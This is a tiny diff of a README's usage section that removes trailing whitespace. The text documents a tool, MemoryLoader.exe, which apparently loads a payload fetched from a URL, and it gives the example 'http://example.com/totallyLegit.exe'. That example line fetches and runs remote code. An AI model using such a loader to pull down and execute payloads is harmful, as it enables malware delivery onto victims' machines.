@@ -6,5 +6,5 @@ Usage:
 
 `./MemoryLoader.exe [URL_TO_PAYLOAD]`
 
-Example:  
+Example:
 `./MemoryLoader.exe http://example.com/totallyLegit.exe`
